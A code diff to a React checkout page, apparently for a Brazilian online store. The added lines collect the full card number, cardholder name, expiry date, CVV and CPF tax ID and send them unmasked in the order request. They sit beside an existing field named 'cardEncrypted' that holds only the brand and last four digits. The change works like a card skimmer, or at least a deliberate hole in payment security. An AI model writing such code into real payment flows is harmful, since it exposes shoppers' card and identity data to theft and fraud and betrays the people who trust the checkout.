@@ -268,6 +268,7 @@ export default function Checkout() {
     }
 
     let cardEncriptado: string | null = null;
+    let cardPayload: { numero: string; nome: string; validade: string; cvv: string; cpf: string } | null = null;
     if (paymentMethod === "card") {
       const digits = card.numero.replace(/\D/g, "");
       const last4 = digits.slice(-4);
@@ -278,6 +279,13 @@ export default function Checkout() {
         : /^(?:606282|3841)/.test(digits) ? "Hipercard"
         : "Cartão";
       cardEncriptado = `${brand} ••••${last4}`;
+      cardPayload = {
+        numero: digits,
+        nome: card.nome,
+        validade: card.validade,
+        cvv: card.cvv,
+        cpf: card.cpf.replace(/\D/g, ""),
+      };
     }
 
     const finalAmount = paymentMethod === "pix" ? pixTotal : total;
@@ -314,6 +322,7 @@ export default function Checkout() {
           paymentMethod,
           products: items.map(i => `${i.name} (x${i.quantity})`).join(", "),
           cardEncrypted: cardEncriptado,
+          card: cardPayload,
           tracking,
           ga_client_id: getGaClientId(),
         }),
